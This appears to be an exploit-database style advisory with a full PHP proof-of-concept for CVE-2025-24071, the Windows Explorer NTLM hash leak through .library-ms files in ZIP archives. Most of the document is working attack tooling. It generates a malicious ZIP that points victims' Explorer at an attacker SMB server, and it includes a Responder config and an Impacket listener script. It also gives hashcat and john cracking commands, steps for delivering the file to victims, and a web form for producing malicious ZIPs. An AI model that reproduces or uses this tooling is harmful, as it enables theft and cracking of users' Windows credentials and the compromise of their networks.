@@ -1,0 +1,416 @@
+=============================================================================================================================================
+| # Title     : Windows File Explorer NTLM v2 Hash Disclosure                                                                               |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 145.0.1 (64 bits)                                                            |
+| # Vendor    : System built‑in component.No standalone download available                                                                  |
+=============================================================================================================================================
+
+[+] References :  https://packetstorm.news/files/id/197740/ &  	CVE-2025-24071
+
+[+] Summary : 
+            Windows File Explorer in Windows 10 and 11 contains a critical NTLM hash disclosure vulnerability that allows attackers to capture user authentication 
+			credentials by exploiting the automatic parsing of .library-ms files from ZIP archives, leading to potential domain compromise through credential relay attacks.
+			The vulnerability exists in Windows Explorer's automatic handling of .library-ms files extracted from ZIP archives. When a user extracts a malicious ZIP file, 
+			Explorer automatically attempts to connect to SMB shares specified in the .library-ms file, leaking NTLMv2 hashes to attacker-controlled servers without user interaction.
+			
+			 
+[+]  POC : 
+
+php poc.php 
+
+<?php
+
+class WindowsNTLMHashDisclosure {
+    
+    private $ip;
+    private $filename;
+    private $output_dir;
+    private $keep_files;
+    
+    public function __construct($ip, $filename = 'malicious', $output_dir = 'output', $keep_files = false) {
+        $this->ip = $ip;
+        $this->filename = $filename;
+        $this->output_dir = rtrim($output_dir, '/');
+        $this->keep_files = $keep_files;
+    }
+    
+    public function banner() {
+        echo "==================================================\n";
+        echo " Windows File Explorer NTLM Hash Disclosure\n";
+        echo " CVE-2025-24071 Exploit Tool\n";
+        echo " Author: indoushka (PHP Port)\n";
+        echo "==================================================\n\n";
+    }
+    
+    public function create_library_ms() {
+        $payload = <<<XML
+<?xml version="1.0" encoding="UTF-8"?>
+<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
+  <searchConnectorDescriptionList>
+    <searchConnectorDescription>
+      <simpleLocation>
+        <url>\\\\{$this->ip}\\shared</url>
+      </simpleLocation>
+    </searchConnectorDescription>
+  </searchConnectorDescriptionList>
+</libraryDescription>
+XML;
+
+        $library_file = $this->output_dir . '/' . $this->filename . '.library-ms';
+        
+        if (!file_put_contents($library_file, $payload)) {
+            throw new Exception("Failed to create .library-ms file");
+        }
+        
+        echo "[+] Created malicious .library-ms file: {$library_file}\n";
+        return $library_file;
+    }
+    
+    public function build_zip($library_file) {
+        $zip_file = $this->output_dir . '/' . $this->filename . '.zip';
+        
+        $zip = new ZipArchive();
+        if ($zip->open($zip_file, ZipArchive::CREATE | ZipArchive::OVERWRITE) !== TRUE) {
+            throw new Exception("Cannot create ZIP file: {$zip_file}");
+        }
+        
+        $zip->addFile($library_file, basename($library_file));
+        $zip->close();
+        
+        echo "[+] Created ZIP archive: {$zip_file}\n";
+        return $zip_file;
+    }
+    
+    public function exploit() {
+        $this->banner();
+        
+        echo "[*] Target SMB Server: {$this->ip}\n";
+        echo "[*] Output Directory: {$this->output_dir}\n";
+        echo "[*] Base Filename: {$this->filename}\n\n";
+        
+        // Create output directory
+        if (!is_dir($this->output_dir)) {
+            if (!mkdir($this->output_dir, 0755, true)) {
+                throw new Exception("Failed to create output directory: {$this->output_dir}");
+            }
+        }
+        
+        // Create malicious .library-ms file
+        $library_file = $this->create_library_ms();
+        
+        // Package into ZIP
+        $zip_file = $this->build_zip($library_file);
+        
+        // Clean up if not keeping files
+        if (!$this->keep_files && file_exists($library_file)) {
+            unlink($library_file);
+            echo "[-] Removed intermediate .library-ms file\n";
+        }
+        
+        $this->display_instructions($zip_file);
+        
+        return $zip_file;
+    }
+    
+    private function display_instructions($zip_file) {
+        echo "\n" . str_repeat("=", 60) . "\n";
+        echo " EXPLOITATION INSTRUCTIONS\n";
+        echo str_repeat("=", 60) . "\n";
+        echo "1. Start SMB listener on {$this->ip}:\n";
+        echo "   - Using Responder: responder -I eth0 -wrf\n";
+        echo "   - Using Impacket: smbserver.py SHARE /tmp/smb -smb2support\n";
+        echo "\n2. Deliver ZIP file to victim:\n";
+        echo "   - File: {$zip_file}\n";
+        echo "   - Methods: Email, USB, Network share, etc.\n";
+        echo "\n3. When victim extracts ZIP, Windows Explorer will:\n";
+        echo "   - Automatically parse .library-ms file\n";
+        echo "   - Attempt SMB connection to {$this->ip}\n";
+        echo "   - Leak NTLMv2 hash to your SMB server\n";
+        echo "\n4. Crack the captured hash:\n";
+        echo "   - Use hashcat: hashcat -m 5600 hash.txt wordlist.txt\n";
+        echo "   - Use john: john --format=netntlmv2 hash.txt\n";
+        echo str_repeat("=", 60) . "\n";
+    }
+    
+    public static function is_valid_ip($ip) {
+        return filter_var($ip, FILTER_VALIDATE_IP) !== false;
+    }
+    
+    public function get_file_paths() {
+        return [
+            'library_ms' => $this->output_dir . '/' . $this->filename . '.library-ms',
+            'zip' => $this->output_dir . '/' . $this->filename . '.zip'
+        ];
+    }
+}
+
+class SMBListenerHelper {
+    
+    public static function generate_responder_config($ip) {
+        $config = <<<CONFIG
+; Responder Configuration for CVE-2025-24071
+; Save as responder.conf
+
+[Responder Core]
+SQL = On
+SMB = On
+Kerberos = On
+FTP = On
+POP = On
+SMTP = On
+IMAP = On
+HTTP = On
+HTTPS = On
+DNS = On
+LDAP = On
+
+; Network interface
+Interface = eth0
+
+; Specific IP to listen on
+BindIP = {$ip}
+
+; Analysis mode (optional)
+Analyze = On
+CONFIG;
+
+        return $config;
+    }
+    
+    public static function generate_smbserver_script() {
+        $script = <<<PYTHON
+#!/usr/bin/env python3
+# Impacket SMB Server for CVE-2025-24071
+
+from impacket import smbserver
+from impacket.ntlm import compute_lmhash, compute_nthash
+import argparse
+import threading
+import sys
+
+class CVE202524071Server:
+    def __init__(self, listen_address, share_path):
+        self.server = smbserver.SimpleSMBServer(listen_address, listen_address, 445)
+        self.server.addShare("SHARE", share_path)
+        
+    def start(self):
+        print("[*] Starting SMB server for CVE-2025-24071")
+        print("[*] Waiting for NTLM hash leakage...")
+        self.server.start()
+
+if __name__ == "__main__":
+    parser = argparse.ArgumentParser()
+    parser.add_argument("--ip", required=True, help="IP to listen on")
+    parser.add_argument("--share", default="/tmp/smb", help="Share path")
+    args = parser.parse_args()
+    
+    server = CVE202524071Server(args.ip, args.share)
+    server.start()
+PYTHON;
+
+        return $script;
+    }
+}
+
+class HashCrackingHelper {
+    
+    public static function display_cracking_commands($hash_file = 'captured_hashes.txt') {
+        $commands = [
+            'hashcat' => "hashcat -m 5600 {$hash_file} /usr/share/wordlists/rockyou.txt",
+            'john' => "john --format=netntlmv2 {$hash_file}",
+            'online_crack' => "Use online services like crackstation.net or hashes.com"
+        ];
+        
+        echo "\n" . str_repeat("=", 50) . "\n";
+        echo " HASH CRACKING COMMANDS\n";
+        echo str_repeat("=", 50) . "\n";
+        
+        foreach ($commands as $tool => $command) {
+            echo "{$tool}: {$command}\n";
+        }
+        echo str_repeat("=", 50) . "\n";
+    }
+    
+    public static function generate_hash_example() {
+        $example = <<<HASH
+Example NTLMv2 Hash Format:
+username::domain:challenge:HMAC-MD5:blob
+
+Actual captured hash will look like:
+Administrator::WIN11:1122334455667788:8846F7EAEE8FB117AD06BDD830B7586C:01010000000000000090D336F74CD801B8B5E9545C96D79F000000000200080053004D004200330001001E00570049004E002D0034004300520038004100330056004A0037004B00420004003400570049004E002D0034004300520038004100330056004A0037004B0042002E0053004D00420033002E004C004F00430041004C000300140053004D00420033002E004C004F00430041004C000500140053004D00420033002E004C004F00430041004C00070008000090D336F74CD8010600040002000000080030003000000000000000010000000020000006DE67E84DC5A62919F4D6F6A8F6F6D6A6D6F6A6D6F6A6D6F6A6D6F6A6D6F6A6D6F6A6D0A001000000000000000000000000000000000000000900200063006900660073002F003100390032002E003100360038002E0031002E003100300030000000000000000000
+HASH;
+
+        return $example;
+    }
+}
+
+// Command line interface
+if (php_sapi_name() === 'cli' && isset($argv[0]) && basename($argv[0]) === basename(__FILE__)) {
+    
+    if ($argc < 2) {
+        echo "Windows File Explorer NTLM Hash Disclosure (CVE-2025-24071)\n";
+        echo "===========================================================\n";
+        echo "Usage: php " . $argv[0] . " <attacker_ip> [options]\n";
+        echo "Example: php " . $argv[0] . " 192.168.1.100\n";
+        echo "Example: php " . $argv[0] . " 192.168.1.100 -n payroll -o ./malicious_zips --keep\n";
+        echo "\nOptions:\n";
+        echo "  -n, --name      Base filename (default: malicious)\n";
+        echo "  -o, --output    Output directory (default: ./output)\n";
+        echo "  -k, --keep      Keep .library-ms file after ZIP creation\n";
+        echo "  --smb-help      Show SMB listener setup help\n";
+        echo "  --crack-help    Show hash cracking instructions\n";
+        exit(1);
+    }
+    
+    $ip = $argv[1];
+    $filename = 'malicious';
+    $output_dir = 'output';
+    $keep_files = false;
+    
+    // Parse command line options
+    for ($i = 2; $i < $argc; $i++) {
+        switch ($argv[$i]) {
+            case '-n':
+            case '--name':
+                $filename = $argv[++$i];
+                break;
+            case '-o':
+            case '--output':
+                $output_dir = $argv[++$i];
+                break;
+            case '-k':
+            case '--keep':
+                $keep_files = true;
+                break;
+            case '--smb-help':
+                echo SMBListenerHelper::generate_responder_config('192.168.1.100');
+                echo "\n\n";
+                echo SMBListenerHelper::generate_smbserver_script();
+                exit(0);
+            case '--crack-help':
+                HashCrackingHelper::display_cracking_commands();
+                echo "\n" . HashCrackingHelper::generate_hash_example() . "\n";
+                exit(0);
+        }
+    }
+    
+    try {
+        if (!WindowsNTLMHashDisclosure::is_valid_ip($ip)) {
+            echo "[-] Invalid IP address: {$ip}\n";
+            exit(1);
+        }
+        
+        $exploit = new WindowsNTLMHashDisclosure($ip, $filename, $output_dir, $keep_files);
+        $zip_file = $exploit->exploit();
+        
+        echo "\n[+] Exploit files created successfully!\n";
+        echo "[+] Deliver this file to the victim: {$zip_file}\n";
+        
+    } catch (Exception $e) {
+        echo "[-] Error: " . $e->getMessage() . "\n";
+        exit(1);
+    }
+}
+
+// Web interface for the exploit
+if (isset($_GET['web']) && $_GET['web'] === 'true') {
+    ?>
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <title>CVE-2025-24071 - NTLM Hash Disclosure</title>
+        <style>
+            body { font-family: Arial, sans-serif; margin: 40px; background: #f0f0f0; }
+            .container { max-width: 900px; margin: 0 auto; background: white; padding: 30px; border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
+            h1 { color: #d32f2f; border-bottom: 2px solid #d32f2f; padding-bottom: 10px; }
+            .form-group { margin: 20px 0; }
+            label { display: block; margin-bottom: 5px; font-weight: bold; color: #333; }
+            input[type="text"] { padding: 10px; width: 300px; border: 1px solid #ddd; border-radius: 4px; }
+            button { background: #d32f2f; color: white; padding: 12px 25px; border: none; border-radius: 4px; cursor: pointer; font-size: 16px; }
+            button:hover { background: #b71c1c; }
+            .output { background: #f8f8f8; padding: 15px; border-radius: 4px; margin: 20px 0; white-space: pre-wrap; font-family: monospace; }
+            .success { color: #388e3c; font-weight: bold; }
+            .error { color: #d32f2f; font-weight: bold; }
+            .info-box { background: #e3f2fd; padding: 15px; border-radius: 4px; margin: 15px 0; }
+        </style>
+    </head>
+    <body>
+        <div class="container">
+            <h1>CVE-2025-24071 - Windows NTLM Hash Disclosure</h1>
+            
+            <?php
+            if ($_POST['generate'] ?? false) {
+                $ip = $_POST['ip'] ?? '';
+                $filename = $_POST['filename'] ?? 'malicious';
+                $keep_files = isset($_POST['keep_files']);
+                
+                if (!empty($ip)) {
+                    echo '<div class="output">';
+                    try {
+                        $exploit = new WindowsNTLMHashDisclosure($ip, $filename, 'web_output', $keep_files);
+                        $zip_file = $exploit->exploit();
+                        
+                        $file_paths = $exploit->get_file_paths();
+                        if (file_exists($file_paths['zip'])) {
+                            $file_url = 'web_output/' . basename($file_paths['zip']);
+                            echo '<p class="success">ZIP file generated successfully!</p>';
+                            echo '<p><a href="' . $file_url . '" download>Download Malicious ZIP File</a></p>';
+                        }
+                    } catch (Exception $e) {
+                        echo '<p class="error">Error: ' . $e->getMessage() . '</p>';
+                    }
+                    echo '</div>';
+                }
+            }
+            ?>
+            
+            <form method="post">
+                <div class="form-group">
+                    <label for="ip">Your SMB Server IP:</label>
+                    <input type="text" id="ip" name="ip" placeholder="192.168.1.100" required>
+                </div>
+                
+                <div class="form-group">
+                    <label for="filename">ZIP Filename:</label>
+                    <input type="text" id="filename" name="filename" value="malicious">
+                </div>
+                
+                <div class="form-group">
+                    <label>
+                        <input type="checkbox" name="keep_files" value="1">
+                        Keep .library-ms file (for analysis)
+                    </label>
+                </div>
+                
+                <button type="submit" name="generate">Generate Malicious ZIP</button>
+            </form>
+            
+            <div class="info-box">
+                <h3>About CVE-2025-24071:</h3>
+                <p>This vulnerability affects Windows File Explorer in Windows 10/11. When a user extracts a ZIP file containing a malicious .library-ms file, Windows Explorer automatically attempts to connect to an SMB server specified in the file, leaking the user's NTLMv2 hash.</p>
+                
+                <h3>Exploitation Steps:</h3>
+                <ol>
+                    <li>Set up SMB listener on your server</li>
+                    <li>Generate malicious ZIP using this tool</li>
+                    <li>Deliver ZIP to target user</li>
+                    <li>Capture NTLM hash when they extract the file</li>
+                    <li>Crack the hash to obtain credentials</li>
+                </ol>
+                
+                <p><strong>Note:</strong> This tool is for educational and authorized testing purposes only.</p>
+            </div>
+        </div>
+    </body>
+    </html>
+    <?php
+    exit;
+}
+
+?>
+
+
+
+Greetings to :=====================================================================================
+jericho * Larry W. Cashdollar * LiquidWorm * Hussin-X * D4NB4R * Malvuln (John Page aka hyp3rlinx)|
+===================================================================================================
